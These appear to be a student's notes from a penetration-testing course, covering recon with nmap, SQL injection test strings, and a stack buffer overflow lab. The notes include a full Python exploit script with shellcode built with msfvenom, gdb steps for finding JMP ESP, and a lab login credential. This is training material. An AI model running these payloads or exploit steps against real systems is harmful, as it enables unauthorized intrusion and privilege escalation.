
## Misc 
https://sec.cybbh.io/public/security/latest/index.html
Test Day: August 15th
http://10.50.20.250:8000/

JOHA-005-M : CHT8QBJ8TQBlv7S : 10.50.20.235
joseph.m.hassett19@workstation17:~$ ssh student@10.50.20.235 -X



Lin-OPS: 10.50.40.22

xfreerdp /u:student /v:10.50.37.222 /dynamic-resolution +glyph-cache +clipboard
Win-OPS: 10.50.37.222

## Day 1
### Pen Testing
	Phase 1: Define Goals
	Phase 2: Recon
	Phase 3: Footpriting
	Phase 4: Exploitation
	Phase 5: Post Exploitation
	Phase 6: Document Mission
	
#### Pen Testing Test Reporting
	OPNotes
		Actions being taken that works, maps, the things that have worked. Keeping track of the steps
		You want to be able to pass them off to your teamates, same with the technical summary

	Penetration Test Reporting
		Executive Summary
			The tops, not evertything but a summary
		Technical Summary
			In the weeds, the more technical stuff
	
### Recon
#### NMAP
	nmap --script <filename><category><directory
	proxychains nmap -v -sT -T5 --script http-enum.nse 192.168.28.100
	
#### Google Hacking
	site: <site> <what you want to search>


### Exploit Research
	website for exploits
	https://www.exploit-db.com/
#### SQL
	Test with ', some exmaples
	username', 'password', 'email@email', 1) -- 'comment

	username', 'password', 'email@email', 1) -- 'comment , valid

	username', 'password', 'email@email', 1)

	tom' or 1='1' -- 'comment == 'tom' or 1='1' -- 'comment' AND password='' -> successful to get admin credentials

	ram' or 1='1 -> shows as '%ram' or 1='1%'
	
### Steps to Make Payload

1. Make sure you find a way to buffer overflow the program
2. Once the program is possible to overflow run in gdb and run it and then find the EIP and ESP
3. use the commands below 

	env - gdb ./func
	unset env COLUMNS
(gdb) 	unset env LINES 
	info proc map
	find /b "addressafterheap", "addressafterstack", 0xff, 0xe4 
	find from after heap, to end of stack, JMP ESP
	
	file <<<$(echo "file <<<$(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa...") in gdb and find the byte offset, that will be what is used to fill the buffer
	
4. Use metasploitable to create the payload and then add that to the script, run  the file and boom 

## Payloads
	file <<<$(echo "file <<<$(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa...")

	msfvenom -l payloads
	msfvenom -p linux/x86/exec CMD=iconfig -b '\x00' -f python
	msfconsole
	use payload/linux/x86/exec
	show options
	set CMD whoami && ifconfig
	generate -b "\x00" -f python
	
using our script on the other script to execute payload

#!/usr/bin/python2.7
# FILL UP THE BUFFER 
buf = "A" * 62

#EIP Register to JMP ESP

buf += "\x59\x3b\xde\xf7"

#The mem addresses for JMP ESP

'''
0xf7de3b59 "\x59\x3b\xde\xf7"
0xf7f588ab
0xf7f645fb
0xf7f6460f
'''
## Assits with encoding NOP SLED
buf += "\x90" * 10

# Shell Code / palyoad below
# set CMD whoami && ifconfig


buf += b"\xdb\xc3\xd9\x74\x24\xf4\x58\xbb\xe6\xef\x4a\x63"
buf += b"\x29\xc9\xb1\x0e\x31\x58\x19\x03\x58\x19\x83\xe8"
buf += b"\xfc\x04\x1a\x20\x68\x90\x7c\xe7\x08\x48\x52\x6b"
buf += b"\x5c\x6f\xc4\x44\x2d\x07\x15\xf3\xfe\xb5\x7c\x6d"
buf += b"\x88\xda\x2d\x99\x99\x1c\xd2\x59\xe9\x74\xbd\x38"
buf += b"\x78\xed\x61\x9d\xa4\xcd\x08\x87\xcb\x62\xa5\x21"
buf += b"\x65\x1b\x39\xf9\x26\x6a\xd8\xc8\x49"

print(buf)

wiremask.eu



0xf7def000, 0xffffe000

find /b 0xf7def000, 0xffffe000, 0xff, 0xe4

0xf7df1b51
0xf7f6674b
0xf7f72753
0xf7f72c6b 

sudo /.hidden/inventory.exe <<<$(./inventbuff.sh)

















